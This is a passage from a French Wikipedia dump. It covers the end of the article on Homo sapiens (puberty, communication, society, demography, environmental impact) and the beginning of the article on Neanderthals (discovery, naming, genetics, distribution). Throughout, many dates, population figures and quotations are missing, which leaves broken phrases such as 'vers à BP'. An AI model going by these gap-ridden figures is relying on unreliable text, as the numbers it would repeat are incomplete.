À la puberté, le corps des femelles et des mâles humains change via la modification des caractères sexuels primaires et la mise en place des caractères sexuels secondaires, marquant le début de la capacité à la reproduction. Chez les femelles, au niveau morphologique, il y a notamment un développement des parties adipeuses des hanches, un développement de seins dont les formes, inhabituelles pour une primate femelle, auraient évolué en évoquant celles des fesses, la courbure de la lordose lombaire et la formation d'une taille en violoncelle. La modification de la pilosité, ainsi que la bipédie permanente, ont diverses conséquences : le sexe est en partie dissimulé par la posture bipède et par la pilosité pubienne, celle-ci pourrait favoriser la dissémination de phéromones. Les femelles humaines possèdent deux caractères évolutifs originaux : le camouflage de l'œstrus et une réceptivité sexuelle constante (à n'importe quel moment de leur cycle menstruel). Le corps des mâles passe aussi par des modifications : taille plus grande ; musculature et épaules plus puissantes (corps en trapèze) ; allongement du pénis dépourvu d'os pénien, contrairement aux autres primates, notamment le chimpanzé et le gorille, ce qui autorise une variation angulaire de l'érection, utile selon les positions de l'accouplement ; mue de la voix ; développement de la pilosité pubienne et faciale ; testicules de taille relativement moyenne, en relation avec la capacité de répéter des copulations.
Chez l'humain, il n'existe pas à proprement parler de parade nuptiale codifiée, même si certaines pratiques et situations, liées notamment à des activités culturelles telles que la danse et la musique, peuvent s'avérer plus propices que d'autres à la formation de couples. Toutefois, selon l'ethnomusicologue australien , les origines de la danse et de la musique ne seraient pas liés aux comportements reproductifs, mais plutôt aux moyens naturels de défense, et représenteraient une forme d'aposématisme. La séduction est, chez les humains, un processus souvent long et complexe, du fait de l'importance de l'investissement parental.
Motivation et émotion.
L'émotion est une expérience psychophysiologique complexe de l'état d'esprit d'un individu lorsqu'il réagit aux influences biochimiques (internes) et environnementales (externes). Chez les humains, l'émotion inclut fondamentalement . L'émotion est associée à l'humeur, au tempérament, à la personnalité, à la disposition et à la motivation.
Une taxonomie non définitive des émotions existe. Certaines catégorisations incluent :
Il faut distinguer, entre l'émotion et les résultats d'émotions, principalement les expressions et les comportements émotionnels. Chaque individu réagit généralement d'une manière déterminée par son état émotionnel, sa réponse se situant généralement dans l'un des axes combattre – fuir – subir.
Sommeil et rêve.
L'humain est un animal diurne, même s’il peut se tenir éveillé la nuit, ou dormir le jour. Son rythme circadien n'est d'ailleurs pas tout à fait ajusté à la durée du jour.
Comportement.
" manifeste une activité culturelle variée, qui se présente notamment sous la forme :
On admet qu'il existe des cultures simples chez les autres primates actuels (méthode de toilettage, outils à termites…) mais ce n'est qu'au sein de l'espèce humaine que l'on constate une modification de la culture avec un aspect cumulatif, ce qui lui permet d'atteindre un haut niveau de complexité.
Un aspect important de la culture humaine, qui améliore à la fois sa transmission et son accumulation (mais aussi le dogmatisme), est l'existence de l'écriture.
La culture est hétérogène et différencie des groupes d'individus. L'étude de ces groupes appelés peuples et de leurs différentes caractéristiques est l'objet de l'ethnologie.
Les premières cultures techniques qui se sont traduites par la confection des premiers outils ou la maîtrise du feu sont bien antérieures à '. Les premiers rites funéraires sûrement liés à des croyances, les premiers objets artistiques ou décoratifs sont attribués à '. En revanche, l'art préhistorique, qu'il soit pariétal, rupestre ou mobilier, et les premières représentations humaines font leur apparition au début du Paléolithique supérieur, chez l'espèce humaine moderne.
Communication.
Comme tous les hominidés, l’humain manifeste un comportement social complexe et dispose d'aptitudes à la communication telles qu'une expressivité faciale, accentuée par la mobilité des sourcils qu'offre l'absence de bourrelet sus-orbitaire. Un autre élément notable de l'expressivité faciale est la forme des yeux. En effet, chez l’humain, le blanc de l'œil est visible et permet de suivre aisément la direction du regard. Cette particularité est unique parmi les mammifères, et peut-être même dans tout le règne animal.
Les humains sont capables de vocaliser un langage articulé complexe, appelé parole, et dont l'usage particulier, appelé langue, se transmet de façon culturelle. Les vocalisations et l’acquisition du langage sont liées à la protéine FOXP2, qui semble être plus abondante dans le cerveau féminin, ce qui pourrait expliquer une maîtrise du langage plus rapide chez les petites filles. À un degré bien moindre que l'articulation, le langage implique parfois l'usage de clics.
Les humains manifestent aussi un réflexe respiratoire et nerveux, appelé rire, qui permet d’exprimer la joie ou l’incongruité d’une situation. Le rire semble inné et propre à l’espèce, mais il existerait néanmoins sous une forme moins accentuée chez d’autres primates et même chez les rats. Le rire est doté d’un pouvoir communicatif et peut faire office de signal d’apaisement dans une situation éventuellement conflictuelle.
Le rire possède une version atténuée se limitant à une expression faciale, appelée sourire, qui semble ne pas avoir d'équivalent non plus chez les autres Hominidés à l'exception peut-être du chimpanzé. Contrairement au rire (qui peut tout de même être simulé), le sourire peut être déclenché de façon consciente, ce qui lui fait jouer un rôle particulier dans les conventions sociales : le sourire est, dans certaines cultures, un élément de salutation requis par la politesse.
Une autre réponse émotionnelle propre à l'espèce peut aussi être observée, en particulier chez les individus jeunes : le pleur. Le caractère unique du pleur chez l'être humain est toutefois disputé.
Société, gouvernement et politique.
Les humains, pour qui le nombre de Dunbar est estimé à 150, forment des sociétés complexes et souvent hiérarchisées, dont le fonctionnement est essentiellement basé sur une répartition des activités qui peut prendre la forme de la division du travail. Au sein de ces sociétés, chaque individu peut avoir des moyens de subsistance extrêmement variés, qui dépendent du type de société dont il s’agit, et de la position hiérarchique qu’il y occupe. Ces sociétés s'affrontent souvent dans des conflits appelés guerres, le plus souvent liés au partage des ressources, à la religion ou à l'occupation territoriale. Selon le professeur David Carrier de l'université de l'Utah, le rôle de la violence dans l'évolution humaine serait suffisant pour être visible dans l'anatomie, notamment en ce qui concerne la forme et la biomécanique des mains. Selon une étude anthropologique dont les résultats ont été publiés en 2013, la guerre est rare parmi les peuples nomades de type chasseurs-cueilleurs, et serait surtout présente chez les peuples sédentarisés pratiquant l'agriculture.
Arts.
Bien que les premières manifestations de préoccupations esthétiques ou symboliques soient attribuables à "Homo neanderthalensis" et datent du Paléolithique moyen, les plus anciennes représentations humaines sont le fait d’"" et peuvent être datées du Paléolithique supérieur (vers à BP). Ainsi, à l'Aurignacien (vers à BP), premier faciès culturel attribué aux "Homo" européens, sont associées les statuettes des grottes de Vogelherd, de Geissenklösterle et de Hohlenstein-Stadel qui restituent des figures en ronde-bosse représentant des mammouths, des félins, des ours, des chevaux et des humains. Dans l'art pariétal, la représentation de vulves féminines et d'individus mi-humain mi-animal est attestée, comme à la grotte Chauvet. Au Gravettien ( à BP) sont sculptées des figures féminines dites « Vénus paléolithiques ». Au Magdalénien ( à BP), les représentations humaines sur paroi ou sur objet se font plus fréquentes.
Science.
Certains aspects de la culture humaine, notamment la médecine, et les connaissances scientifiques et techniques, influencent les processus biologiques et reproductifs, et ont un impact sur l'espérance de vie ou la fécondité, et sur la démographie.
Impact planétaire.
Habitat et démographie.
Par sa capacité à maîtriser des techniques lui permettant d'affronter des conditions climatiques difficiles, "Homo sapiens" prospère sous toutes les latitudes et sur tous les continents, à l'exception de l'Antarctique.
Il a tendance à se regrouper à l'intérieur de villes et de grandes cités atteignant parfois plusieurs millions d'habitants, souvent situées sur une côte ou sur un fleuve. Ailleurs, il occupe l'espace indirectement, notamment par son activité agricole, qui façonne le paysage et influe fortement sur les écosystèmes.
La population humaine est estimée à près de d'individus en 2023. Les perspectives démographiques pour le siècle à venir sont incertaines. Compte tenu des incertitudes concernant l'évolution du comportement reproductif des individus, on ignore à quel niveau la population humaine pourrait se stabiliser, ni même si elle se stabilisera. En effet, il est difficile de prévoir si le taux de fécondité au niveau mondial va baisser sous les 2 enfants par femme, ou s'il se stabilisera au-dessus du seuil de remplacement ( par femme), et si le taux de mortalité mondial va continuer de baisser au même rythme que jusqu'à présent.
L'Organisation des Nations unies s'attend à ce que la population mondiale atteigne un pic aux alentours de d'individus en 2100. Cette projection suppose que le taux de fécondité au niveau mondial descende en dessous de deux enfants par femme bien avant 2100. L'éventualité d'un crash démographique est envisagée par certains démographes, tandis qu'un modèle mathématique conçu en 2013 à partir des données démographiques recueillies de 1950 à 2010 suggère que l'effectif humain mondial pourrait se stabiliser aux alentours de l'an 2050.
Impact sur l'environnement.
"Homo sapiens" exerce un impact important sur son environnement, surtout depuis l'époque moderne, parfois appelée anthropocène, essentiellement du fait de ses activités agricoles et industrielles. Cet impact se traduit en particulier par un phénomène d'extinction d'espèces considéré depuis peu comme la sixième extinction massive, parfois appelée crise anthropique.
Dans certaines régions du monde, cet impact est ancien ; par exemple, la déforestation de la Chine a été entamée il y a environ. On a longtemps pensé que l’extension de l’agriculture en Afrique centrale avait été rendue possible uniquement par un recul naturel de la forêt tropicale humide primaire dû à de longues périodes de sécheresse sévère qui se seraient succédé il y a environ. Mais l'analyse des sédiments anciens déposés par le fleuve Congo, qui offrent un enregistrement continu du Climat d'Afrique centrale pour les années, réalisée par des géochimistes, montre que la responsabilité humaine pourrait être au moins en grande partie à l’origine de la relativement brusque disparition de forêts tropicales d'Afrique centrale (il y a environ), via une déforestation active qui a augmenté l’érosion, intensifié les intempéries et asséché cette partie de l’Afrique.
Les carottages de sédiments fournissent des données montrant des modifications des précipitations normalement corrélées aux flux de sédiments pour la période de - à - mais, depuis près de , on observe ' entre précipitations et érosion, montrant que, dans ce cas, '. L’équipe de Germain Bayon, géochimiste à l’Institut français de recherche pour l'exploitation de la mer à Plouzané, suggère que les ancêtres des actuelles ethnies bantous de l'actuel Nigeria et Cameroun, connus pour avoir entamé des migrations en Afrique il y a environ , ont eu en déforestant pour l’agriculture et pour les forges permettant la métallurgie du fer.
En 2012, de nombreux paléobotanistes peinent encore à croire que les outils disponibles à l’époque aient pu permettre aux premiers bantous de la région d’abattre assez d’arbres pour causer des érosions de cette importance, plus graves que celles produites par les abattis avec agriculture sur brûlis actuellement selon Katharina Neumann. D'autres estiment aussi qu'un réchauffement climatique a plutôt été en grande partie responsable de la perte de la forêt tropicale d'Afrique centrale, mais que les premiers Bantous ont effectivement pu exacerber un recul des forêts induit par un réchauffement. Bayon estime lui-même que ces données ne contredisent pas les théories existantes, mais illustrent "". Pour David Harris, l'étude pose par contre des questions importantes concernant les impacts climatiques de la déforestation et d'autres activités humaines susceptibles d'exacerber les effets d’un changement climatique, . "Homo sapiens" semble aussi responsable, en Eurasie et en Amérique du Nord, de l'extinction de presque toutes les espèces de la grande faune et mégafaune qui avait survécu à trois glaciations. La déforestation, qui a tendance à provoquer la réduction, voire la destruction du milieu de vie de nombreuses autres espèces (animales, végétales, fongiques, terrestres et aquatiques), est une pratique ancienne en zone tempérée de l'hémisphère nord, mais récente et très rapide au niveau des forêts tropicales et humides telles que celles d'Amérique du Sud et d'Indonésie et d'Afrique (Bassin du Congo par exemple). La disparition accélérée de groupes entiers d'espèces animales, végétales et fongiques qui en découle, est parfois qualifiée d'« "extinction de l'Holocène" » ou de « " extinction" ».
L'agriculture intensive fait un usage important d'engrais et de pesticides qui peuvent avoir un impact sur l'environnement.
Un autre aspect important de l'impact des humains sur l'environnement est le fait qu'ils transportent de nombreuses espèces domestiques ou synanthropes ; soit un vecteur conséquent d'échanges biotiques intercontinentaux. Un exemple très significatif d'un tel échange est l'échange colombien, déjà évoqué.
Outre sa capacité à faire disparaître des espèces, l'humain influe aussi sur l'évolution d'un bon nombre d'entre elles, notamment du fait de la domestication. De façon plus directe encore, il est aussi capable de modifier le génome de certaines espèces en ayant recours pour cela non pas à la sélection artificielle, mais à une manipulation directe du noyau des cellules germinales, par diverses techniques dite de génie génétique. Ces techniques peuvent consister notamment à prélever des gènes chez une espèce et à les introduire dans le génome d'une espèce qui peut être d'un taxon complètement différent : par exemple, le gène de synthèse de la soie d'un arachnide implanté dans le génome d'une espèce de caprin, ou encore un gène bactérien implanté dans le génome du maïs pour lui permettre de résister au glyphosate. Cette pratique appelée transgénèse fait de l'espèce humaine un vecteur de transfection, ou transfert horizontal de gènes, entre des lignées évolutives séparées depuis plusieurs ères géologiques, ou même plusieurs éons.
Au début du , une espèce de type bactérien, dont le génome a été entièrement conçu par ordinateur, a été créée pour la première fois. On ignore à l'heure actuelle quel pourrait être l'impact de ces productions humaines sur l'environnement à long terme, mais d'ores et déjà l'apparition de ces espèces, par un processus qui ne relève pas de la théorie synthétique de l'évolution, constitue un évènement sans précédent dans l'histoire de la vie sur Terre. La mise au point récente des techniques dites de forçage génétique constitue aussi un jalon remarquable car il permet à des gènes d'être transmis par reproduction sexuée sans pour autant respecter les lois de Mendel.
L'activité humaine produit aussi annuellement environ quarante milliards de tonnes de dioxyde de carbone principalement par l'utilisation de combustibles fossiles comme source primaire d'énergie, ce qui fait de l'espèce humaine le premier facteur biotique de production de ce gaz. Les quantités dégagées sont très importantes, même par rapport aux facteurs de production abiotiques tels que le volcanisme, qui en émet environ cent fois moins. Cette production a entraîné une augmentation sensible de la quantité de CO2 dans l'atmosphère. Le dioxyde de carbone étant un gaz à effet de serre, ces taux élevés dans l'atmosphère sont considérés comme l'un des facteurs prépondérants pour expliquer le réchauffement climatique.

</doc>
<doc id="1483" url="https://fr.wikipedia.org/wiki?curid=1483" title="Homme de Néandertal">
Homme de Néandertal

L' ('), ou Néandertalien"', est une espèce éteinte du genre "Homo", qui a vécu en Europe, au Moyen-Orient et en Asie centrale, jusqu'à environ avant le présent. Selon une étude génétique publiée en 2016, il partage avec l'Homme de Denisova un ancêtre commun remontant à environ . Cet ancêtre partage lui-même avec "Homo sapiens" un ancêtre commun remontant à environ . Les plus anciens Néandertaliens fossiles reconnus comme tels sont ceux de la sima de los Huesos (sierra d'Atapuerca, Espagne), datés de .
Depuis sa découverte en 1856, son statut a varié : un temps considéré comme une sous-espèce d"Homo sapiens" et nommé en conséquence "Homo sapiens neanderthalensis", il est aujourd'hui considéré comme une espèce à part entière.
Particulièrement adapté à un climat froid, l'Homme de Néandertal était physiquement plus robuste, plus lourd et plus trapu qu’"Homo sapiens". La forme oblongue de son crâne se distingue nettement de celle de l'Homme moderne, plus globulaire. Néandertal avait un cerveau un peu plus volumineux en moyenne, mais avec un coefficient d'encéphalisation légèrement moindre.
Premier homme fossile identifié, contemporain d"Homo sapiens", l'Homme de Néandertal a longtemps pâti de jugements négatifs par rapport à l'Homme moderne. Les progrès de l'archéologie préhistorique depuis les années 1960 ont en fait révélé une espèce humaine d'un certain développement culturel. Il maîtrisait différentes techniques avancées comme le collage au brai de bouleau, et certains vestiges fossiles datés de moins de sont considérés comme des sépultures témoignant de rites funéraires.
De nombreux points restent à élucider, comme son ascendance précise ainsi que la date et les conditions de son extinction après plus de d'existence. Les derniers vestiges fossiles ou archéologiques néandertaliens connus sont datés de moins de , dans le sud de la péninsule Ibérique, en Crimée, et dans le Caucase. Toutefois, ces datations restent débattues au sein de la communauté scientifique.
Le séquençage de l'ADN nucléaire néandertalien réalisé depuis 2006 et publié à partir de 2010 a montré un « flux de gènes » ancien entre les hommes de Néandertal et les hommes modernes d'Eurasie. Les humains actuels non africains possèdent entre 1,8 et 2,6 % de gènes néandertaliens, acquis par hybridation il y a environ , peu après leur sortie d'Afrique, et environ 20 % du génome de Néandertal survit dans l'ensemble de la population actuelle à différents endroits de notre génome. Certains gènes néandertaliens auraient été fixés chez l'Homme moderne en raison de leur caractère adaptatif.
Découverte.
Les Néandertaliens avant "Neandertal".
Deux fossiles de Néandertaliens ont été découverts avant celui auquel on a donné ce nom. En 1829, un crâne d'enfant, Engis 2, fut mis au jour par Philippe-Charles Schmerling à Flémalle (Belgique) ; nommé comme la commune voisine parce que Schmerling a pensé qu'il se trouvait sur la commune d'Engis. En 1848, un crâne d'adulte fut trouvé à Gibraltar, dans le site de la carrière de Forbes. Si le premier appartenait à un jeune individu sur lequel les traits caractéristiques des Néandertaliens sont moins évidents, le deuxième aurait pu conduire à reconnaître l'existence d'une espèce humaine fossile. Sans doute était-il trop tôt, comme le prouvent d'ailleurs les difficultés pour faire admettre que les os recueillis en 1856 à Neandertal, en Allemagne, correspondaient bien à un homme fossile.
1856 : "Neandertal" ou la « vallée de l'homme nouveau ».
Le mot « Néandertalien » est tiré de Neandertal, nom d'une petite vallée située sur le territoire des villes d'Erkrath et de Mettmann, entre Düsseldorf et Wuppertal (Allemagne). Au mois d', dans le cadre de l'exploitation d'une carrière, des ouvriers vidèrent une petite cavité de cette vallée, la . Ils y découvrirent des ossements et un fragment de crâne qu'ils remirent à Johann Carl Fuhlrott, un enseignant d'Elberfeld passionné d'histoire naturelle.
Par un heureux hasard, le toponyme "Neandertal" signifie « vallée de l'homme nouveau ». En effet le nom de "Neander" a été donné à cette vallée (en allemand ', anciennement ') en l’honneur de Joachim Neander (1650-1680), 
dont le patronyme allemand d'orgine "Neumann", signifiant « homme nouveau », fut traduit en grec par son grand-père suivant un usage fréquent à l'époque. Ce pasteur et compositeur, auteur de cantiques religieux encore populaires dans le protestantisme allemand, aimait chercher son inspiration dans cette vallée, jadis idyllique.
Comme, à l'époque, le nom de la vallée s'écrivait encore ', l'homme qui y fut découvert reçut le nom latin d’"Homo neanderthalensis". Ultérieurement, une réforme orthographique de l'allemand a supprimé les "h" superflus, mais, la nomenclature évitant de revenir sur les formes latinisées, on a continué à écrire "Homo neanderthalensis". La graphie française la plus courante, proposée par Henri Vallois en 1952, est "Homme de Néandertal", même si l'on trouve parfois "Homme de Neandertal", "Homme de Néanderthal" ou "Homme de Neanderthal". En anglais, la forme ancienne ' est encore très répandue, ce qui peut induire pour la séquence "" une prononciation incorrecte du nom allemand originel.
Une découverte controversée.
Johann Carl Fuhlrott comprend rapidement l'intérêt de la découverte et se rend sur place pour tenter en vain de découvrir d'autres ossements ou des vestiges qui leur seraient associés. Il se rend compte qu'il s'agit d'ossements anciens mais surtout incroyablement primitifs, correspondant à un homme nouveau, d'une « conformation naturelle jusqu'ici inconnue ».
L'Homme de Néandertal est effectivement le premier homme fossile distinct d"'Homo sapiens", et il est découvert avant l'Homme de Cro-Magnon (1868). L'idée même qu'une espèce d'homme distincte de la nôtre ait existé par le passé (et ait disparu) fut d'ailleurs particulièrement difficile à admettre. On se souviendra par exemple que Charles Darwin ne publiera "L'Origine des espèces par la sélection naturelle" qu'en 1859 et qu'il n'élargira explicitement sa théorie à l'homme qu'en 1871 dans "La Filiation de l'homme et la sélection liée au sexe".
Malgré des différences importantes avec les os d'hommes modernes, Fuhlrott reconnait dans ses trouvailles des os humains et les soumet à Hermann Schaaffhausen pour un examen complémentaire. Ce dernier présente ses premières conclusions en 1857. Il estime que les ossements datent d'une période antérieure aux Celtes et aux Germains, et sont ceux d'un individu appartenant à l'une des races sauvages du nord-ouest de l'Europe dont parlent les auteurs latins. Tous les chercheurs n'acceptent pas cette interprétation : pour certains, les os ont appartenu à un genre différent du nôtre, sans doute plus proche du singe ; pour d'autres, ils renvoient à un individu pathologique ou frappé de crétinisme ; d'autres encore évoquent un cosaque mongol aux jambes arquées ayant déserté les armées russes en 1814.
Reconnaissance de l'ancienneté de l'Homme et de son évolution.
Peu à peu les découvertes se multiplient. Viennent d'abord celles de fossiles d"Homo sapiens" associés à des vestiges lithiques et à des animaux disparus (dont l'Homme de Cro-Magnon en 1868) ; puis d'autres "Homo neanderthalensis", encore en place dans les sédiments (mandibule de la grotte des Fées à Arcy-sur-Cure en 1859), complets et présentant les mêmes spécificités anatomiques, mais souvent hors contexte archéologique (pas d'ossements d'animaux ou d'outils associés), ce qui rend difficile leur datation et leur interprétation. Parmi les plus spectaculaires, il faut citer les deux squelettes de la grotte de Spy (région wallonne de Belgique) en 1886 puis la sépulture de l'Homme de La Chapelle-aux-Saints 1 (Corrèze) en 1908. Elles contribuent à faire définitivement accepter l'existence d'une nouvelle espèce d'humains par la communauté scientifique.
Le nom scientifique "Homo neanderthalensis" est proposé en 1864 par William King, professeur au de Galway en Irlande et ancien élève de Charles Lyell. En 1866, Ernst Haeckel propose le nom surprenant d’"Homo stupidus", qui n'est pas retenu en vertu des règles de nomenclature donnant priorité à l'appellation antérieure. Les partisans du rattachement à une sous-espèce parleraient sinon d’"Homo sapiens stupidus" !
Les premières études (et les reconstitutions qui en découlaient) donnèrent de l'Homme de Néandertal une image déformée, accentuant les traits primitifs, voire simiesques. Ce fut le cas de l'étude de l'Homme de La Chapelle-aux-Saints 1 publiée par Marcellin Boule en 1911 : même s'il s'agissait d'une étude très complète, qui fit référence pendant de nombreuses années, elle présentait un Homme de Néandertal voûté, la colonne vertébrale courbée (comme chez les gorilles) et les membres inférieurs semi-fléchis. Il fallut presque un siècle à la communauté scientifique pour corriger cette perception influencée par des "a priori" peu scientifiques.
Au début du , certains furent scandalisés par le fait que ces découvertes se détachaient d'une lecture littérale de la Bible. Ils reprochaient au prêtre catholique Jean Bouyssonie, qui découvrit le squelette d'un Néandertalien à La Chapelle-aux-Saints 1, de soutenir la théorie de l'évolution. Le , la légende d'une caricature de "La Lanterne" indique : « Les savants prétendent que c’est le crâne du plus ancien homme du Monde. C’est une malveillante insinuation destinée à faire croire que les hommes du Monde descendent du singe ». La caricature montre Jean Bouyssonie en soutane, présentant sa découverte à un savant.
Phylogénie et génétique.
Le statut phylogénétique de l'homme de Néandertal provoque encore quelques débats. Il s’agit d’un simple problème de définition de l'espèce.
Lors de sa dénomination en 1864, l’hypothèse d’une espèce distincte avait été privilégiée. Dans les années 1960, certains spécialistes ont considéré les Néandertaliens comme une sous-espèce d"Homo sapiens", comme le généticien Theodosius Dobjansky ou encore le biologiste Ernst Mayr, qui déclarait que « jamais plus d'une seule espèce d'homme n'a existé au même moment ». Aujourd’hui, l’idée d’espèces distinctes est à nouveau dominante, notamment grâce aux apports de la génétique.
Les multiples études paléoanthropologiques effectuées sur les ossements ne permettaient pas de se prononcer clairement sur la classification de l'homme de Néandertal. Des analyses comparées d'ADN nucléaire, extrait d'ossements de Néandertaliens et d"Homo sapiens" anciens et modernes, publiées depuis 2010, ont largement contribué à forger un nouveau consensus.
En 2006, le projet génome de Néandertal, un programme de séquençage de l'ADN nucléaire de l'homme de Néandertal, a été lancé par l'Institut Max-Planck d'anthropologie évolutionniste, à Leipzig en Allemagne, en collaboration avec la société 454 Life Sciences fabriquant des séquenceurs de gènes à haut débit. L'objectif était de connaitre l'étendue du lien de parenté avec l'homme moderne et d'évaluer l'interfécondité de l'homme de Néandertal et de l'homme moderne. Ce projet a permis d'achever le séquençage du génome néandertalien dès 2009 et de publier les premières études en 2010.
Une étude de 2016 exploitant le séquençage de l'ADN nucléaire de spécimens de la Sima de los Huesos (Espagne), datés de , comparé avec le génome de spécimens d"Homo sapiens", d'hommes de Néandertal et d'hommes de Denisova, a attribué les fossiles de la Sima de los Huesos à l'espèce "Homo neanderthalensis", et indiqué que la séparation entre la lignée des hommes modernes et celle des humains archaïques, Dénisoviens et Néandertaliens, a eu lieu entre et avant le présent. La séparation entre Dénisoviens et Néandertaliens est quant à elle estimée entre et . Les fossiles de la Sima de los Huesos étant datés de , on peut estimer cette dernière séparation à un âge d'environ . Pour la première fois, les liens entre différents représentants du genre "Homo" ont pu ainsi être établis.
Génome de Néandertal.
En 2018, le génome de cinq nouveaux Néandertaliens ayant vécu il y a a pu être étudié (le nombre de Néandertaliens dont on a séquencé le génome a ainsi doublé). Ces cinq personnes avaient un génome très similaire à ceux des Néandertaliens tardifs déjà connus, conformément à ce que prédisait leur situation géographique. Et bien que quatre de ces Néandertaliens aient été contemporains des premiers humains modernes en Europe, aucune trace d'apport génétique des hommes modernes n'a pu alors être décelée. Des études ultérieures démontrent cependant qu'il s'est bien produit une introgression de gènes "sapiens" chez Néandertal, sans doute à au moins deux reprises (voir Gènes transmis par "Sapiens" à Néandertal).
Les apports de gènes néandertaliens chez les humains modernes outrafricains proviennent de contacts, peu après leur sortie d'Afrique, avec des Néandertaliens représentatifs des fossiles européens tardifs (leur dernier ancêtre commun datant d'environ ). Mais ces lignées sont sensiblement plus éloignées de celle d'un Néandertal de l'Altaï, qui a divergé il y a environ et des Dénisoviens qui se sont séparés il y a au moins .
Une étude de Johannes Krause, co-directeur du département de paléogénétique humaine de l'Institut Max-Planck d'anthropologie évolutionniste, datant de 2022, précise que Néandertal avait des prédispositions génétiques au langage. L'équipe des scientifiques a extrait et analysé des échantillons d’ADN de néandertaliens provenant de la grotte d'El Sidrón en Espagne. Les généticiens ont isolé chez des Néandertal la variante humaine du gène FOXP2, responsable du développement des zones cérébrales liées au langage.
Histoire et répartition des Néandertaliens.
L'apparition de l'homme de Néandertal est une question complexe qui dépend notamment de la définition qu'on choisit d'adopter. Avant les Néandertaliens classiques, les fossiles deviennent beaucoup plus rares et les datations moins précises, encourageant de nombreuses théories concurrentes. Cependant l'analyse de l'ADN nucléaire de la Sima de los Huesos en 2016 a permis de consolider une première affirmation sur les origines de Néandertal : sa lignée se sépare d'avec "Homo sapiens" il y a environ et ses premiers fossiles seraient justement ceux de la Sima datés de . Ceux-ci présentent de nombreux caractères intermédiaires mais leur dentition est déjà clairement néandertalienne, suggérant une spécialisation initiale de l'appareil masticatoire. Les débats se poursuivent sur l'attribution des autres fossiles de cette période du Pléistocène moyen : Aroeira 3 montre des caractères néandertaliens, mais d'autres fossiles sont d'une attribution moins claire. Jean-Jacques Hublin avance un modèle d'accrétion, où des populations successives auraient accumulé progressivement des caractères dérivés pour donner naissance au jeu de caractères commun aux Néandertaliens classiques.
L'Homme de Néandertal est une espèce dont l'apparition et l'évolution sont connues principalement en Europe. Les Néandertaliens découverts au Moyen-Orient, sur les territoires actuels de l'Irak, de la Syrie (grotte de Dederiyeh), du Liban (Ksar Akil) et d'Israël, ainsi qu’en Asie centrale (Enfant de Teshik-Tash, en Ouzbékistan) et en Sibérie sont moins nombreux et plus tardifs, ce qui pourrait être dû à des fouilles moins avancées. En 2007, la répartition géographique des Néandertaliens a été repoussée de vers l'est par rapport au site de Teshik-Tach, le plus oriental connu jusqu'alors. Des fragments osseux de la grotte Okladnikov, dans l'Altaï, jusqu'alors mal référencés, sont désormais attribués à des Néandertaliens après une analyse génétique de leur ADN mitochondrial par l'Institut Max-Planck d'anthropologie évolutionniste de Leipzig. D'après les chercheurs, l'ADN mitochondrial des Néandertaliens de l'Altaï est d'ailleurs plus proche de celui des Néandertaliens de la grotte Scladina, en Belgique, que de celui de l'Ouzbékistan, suggérant plusieurs vagues de migrations et de peuplements de la région. L'équipe du généticien Svante Pääbo a suggéré que la présence de Néandertaliens dans l'Altaï rendait envisageable une extension plus orientale, en Mongolie, voire jusqu'en Chine.
Les estimations du nombre total de néandertaliens par les paléodémographes présentent une très grande variabilité. L'effectif maximal est évalué à . La densité des populations était très faible, de l'ordre de 100 individus pour , se répartissant en 2 à de 20 à 35 personnes.
Premiers peuplements européens.
Il y a plus d'un million d'années, quelques groupes humains sont arrivés en Europe et ont laissé des traces sous forme de fossiles et de galets taillés de type oldowayen. Les plus anciens fossiles humains européens datent de 1,2 à 1,5 million d'années et ont été mis au jour en Espagne (Sima del Elefante et Homme d'Orce) et en Bulgarie (Kozarnika). Ils sont cependant trop fragmentaires pour avoir pu être attribués à une espèce précise.
"Homo heidelbergensis".
À partir de , le peuplement de l'Europe se renouvelle avec probablement l'arrivée d"Homo heidelbergensis", porteur de l'industrie acheuléenne. À cette époque, plusieurs espèces appartenant au genre "Homo" coexistaient en Europe et en Asie. L'une d'elles a évolué pour donner les Néandertaliens.
Les fossiles européens de cette période sont généralement attribués à "Homo heidelbergensis" : c’est le cas de l’Homme de Tautavel (), trouvé dans le massif des Corbières en France, de la mandibule de Mauer (), trouvée près de Heidelberg en Allemagne, ou du crâne de l'Homme de Petrálona trouvé dans la grotte de Petrálona en Chalcidique (Grèce) (environ).
Prénéandertaliens.
L’évolution qui conduit au développement d’"Homo neanderthalensis", parfois appelée « néandertalisation », est un processus lent et progressif. Elle peut être suivie depuis différents fossiles, qualifiés de « pré-Néandertaliens », jusqu’aux Néandertaliens récents.
Un crâne daté de , Aroeira 3, découvert en 2014 dans la grotte d'Aroeira au centre du Portugal, présente un mélange de caractéristiques jamais observé jusqu'alors chez les humains fossiles ; cet individu présente des traits le rendant proche des Néandertaliens mais aussi certains traits plus primitifs évoquant d'autres espèces humaines éteintes en Europe. Il pourrait contribuer à mieux comprendre les lignées d'Europe ayant évolué vers les Néandertaliens.
Les fossiles de Swanscombe (Kent, Angleterre, ), le crâne de l'Homme de Steinheim (Allemagne, ) et de la Sima de los Huesos à Atapuerca (Espagne, ) sont plus clairement attribués aux Prénéandertaliens.
Les Néandertaliens anciens.
Les restes de trois os longs (humérus, radius, cubitus) du bras gauche d’un individu adulte, de sexe indéterminé, datés d'environ , ont été découverts en septembre 2010 sur une fouille de l'Inrap à Tourville-la-Rivière (Normandie, France). Leur étude a été publiée en octobre 2014.
Les plus anciens fossiles de morphologie néandertalienne presque complète ont des âges compris entre - et - . Parmi eux, on peut citer le crâne de Biache-Saint-Vaast (Pas-de-Calais), vieux de , les restes de La Chaise à Vouthon (Charente), la mandibule de Montmaurin (Haute-Garonne), les crânes de Saccopastore près de Rome en Italie (), ou les 800 fossiles découverts par Dragutin Gorjanović-Kramberger à Krapina en Croatie.
Les Néandertaliens classiques.
Les Néandertaliens les plus typiques, dont les caractères dérivés sont les plus marqués, ont des âges compris entre , date de leur disparition.
Parmi les fossiles de Néandertaliens classiques, outre les vestiges de Néandertal même (environ ), il faut mentionner les squelettes de La Chapelle-aux-Saints 1, du Moustier, de La Ferrassie, de La Quina, de Saint-Césaire dans le Sud-Ouest de la France ou de Spy en Belgique pour ne citer que les plus complets.
Les derniers Néandertaliens connus ont été découverts notamment au Portugal, en Espagne (Zafarraya, ), en Croatie (Vindija, ) et dans le Nord-Ouest du Caucase (Mezmaiskaya, ). Toutes ces dates sont toutefois à considérer avec précaution, les réévaluations successives ayant tendance à vieillir les résultats obtenus par le carbone 14 pour le Paléolithique moyen.
Des recherches conduites de 1999 à 2005 dans la grotte de Gorham à Gibraltar suggèrent que les Néandertaliens y ont vécu jusqu'à , voire . Ils auraient donc longuement cohabité avec les "Homo sapiens", présents dans la région depuis . Ces résultats sont toutefois fortement critiqués, par exemple par le paléoanthropologue Joao Zilhão, de l'université de Bristol.
